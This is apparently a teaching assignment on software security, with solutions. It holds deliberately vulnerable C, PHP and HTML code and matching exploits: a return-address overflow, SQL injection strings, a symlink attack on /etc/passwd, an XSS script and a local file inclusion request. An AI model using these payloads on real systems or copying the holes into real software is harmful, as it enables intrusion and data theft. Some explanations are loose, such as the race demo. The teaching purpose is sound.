### ✅ **Practical Assignment – Chapter 11: Software Security**

---

### 📌 **Part 1: Programming-Based Practical Questions with Solutions**

---

### ✅ **Question 1: Buffer Overflow Exploit**

**Task:**  
- Write a C program with a buffer overflow vulnerability.  
- Demonstrate how to exploit it to overwrite the return address.  

**Instructions:**  
1. **Create the vulnerable program:**  
    - Accepts user input without proper bounds checking.  
2. **Compile and execute:**  
    - Compile the program with stack protection disabled.  
3. **Exploit:**  
    - Inject malicious input to trigger the overflow.  

---

✅ **Solution:**

**Step 1: Write the C Program**

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void vulnerable() {
    char buffer[16];
    printf("Enter input: ");
    gets(buffer);  // Vulnerable function
    printf("You entered: %s\n", buffer);
}

int main() {
    vulnerable();
    return 0;
}
```

**Step 2: Compile the Program**
```bash
gcc -fno-stack-protector -z execstack -o bof_exploit bof_exploit.c
```

**Step 3: Create Malicious Input**
```bash
python3 -c 'print("A"*32 + "\x41\x42\x43\x44")' > input.txt
./bof_exploit < input.txt
```
- The payload overwrites the return address with `0x41424344`.  

---

### ✅ **Question 2: SQL Injection Vulnerability**

**Task:**  
- Create a PHP-based web application with a SQL injection vulnerability.  
- Use SQL commands to extract unauthorized information.  

---

✅ **Solution:**

**Step 1: Vulnerable PHP Code**

```php
<?php
$servername = "localhost";
$username = "root";
$password = "password";
$dbname = "testdb";

$conn = new mysqli($servername, $username, $password, $dbname);

$user = $_GET['username'];
$sql = "SELECT * FROM users WHERE username='$user'";

$result = $conn->query($sql);

if ($result->num_rows > 0) {
    while($row = $result->fetch_assoc()) {
        echo "User: " . $row["username"]. " - Password: " . $row["password"]. "<br>";
    }
} else {
    echo "0 results";
}
$conn->close();
?>
```

**Step 2: Exploit the SQL Injection**
```bash
curl "http://localhost/vuln.php?username=' OR '1'='1"
```
- This query bypasses authentication and retrieves all user data.

---

### ✅ **Question 3: Race Condition Exploit**

**Task:**  
- Write a C program with a race condition vulnerability.  
- Exploit the race condition using multiple processes.

---

✅ **Solution:**

**Step 1: Vulnerable C Program**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

int main() {
    char *filename = "/tmp/race_file";
    int fd = open(filename, O_CREAT | O_RDWR, 0666);

    if (fd < 0) {
        perror("Open failed");
        exit(1);
    }

    printf("Writing to file...\n");
    write(fd, "Secure Data\n", 12);
    
    sleep(5);  // Simulate delay
    close(fd);

    return 0;
}
```

**Step 2: Compile the Program**
```bash
gcc -o race_vuln race_vuln.c
```

**Step 3: Exploit Race Condition**
```bash
while true; do ln -sf /etc/passwd /tmp/race_file; done &
./race_vuln
```
- Repeatedly symlink `/tmp/race_file` to `/etc/passwd`, exploiting the race condition.  

---

### ✅ **Question 4: Cross-Site Scripting (XSS)**

**Task:**  
- Create an HTML form vulnerable to XSS.  
- Inject a malicious script.  

---

✅ **Solution:**

**Step 1: Vulnerable HTML Form**
```html
<!DOCTYPE html>
<html>
<head>
    <title>XSS Demo</title>
</head>
<body>
    <form action="xss.php" method="GET">
        Name: <input type="text" name="name">
        <input type="submit">
    </form>
</body>
</html>
```

**Step 2: XSS Exploit**
```html
<script>alert('Hacked!')</script>
```
- When injected in the form, it executes malicious JavaScript.  

---

### 📌 **Part 2: Capture the Flag (CTF) Questions with Solutions**

---

### ✅ **CTF Question 1: Buffer Overflow**
**Challenge:**  
A server allows the user to input a name, but does not sanitize the input size.  
- **Task:** Send a payload that triggers a segmentation fault.

**Command to exploit:**
```bash
perl -e 'print "A" x 300' | ./vulnerable_binary
```
✅ **Answer:**  
- The large payload causes a buffer overflow, leading to a segmentation fault.

---

### ✅ **CTF Question 2: SQL Injection**
**Challenge:**  
A website login page uses the following query:
```sql
SELECT * FROM users WHERE username='$user' AND password='$pass'
```
- **Task:** Bypass authentication.

✅ **Answer:**  
Use this payload:
```sql
' OR '1'='1
```
- It returns `true` for the `WHERE` clause, bypassing authentication.

---

### ✅ **CTF Question 3: Reverse Engineering**
**Challenge:**  
You are given a binary with a hidden flag.  
- **Task:** Extract the flag using `strings`.

**Command to solve:**
```bash
strings hidden_binary | grep "flag"
```
✅ **Answer:**  
- The `strings` command extracts ASCII text from the binary, revealing the flag.

---

### ✅ **CTF Question 4: File Inclusion Vulnerability**
**Challenge:**  
A PHP-based website accepts a file path via a GET parameter:
```php
include($_GET['file']);
```
- **Task:** Include a system file to read its content.

✅ **Answer:**  
```bash
http://localhost/vuln.php?file=/etc/passwd
```
- This retrieves the system's password file.

---
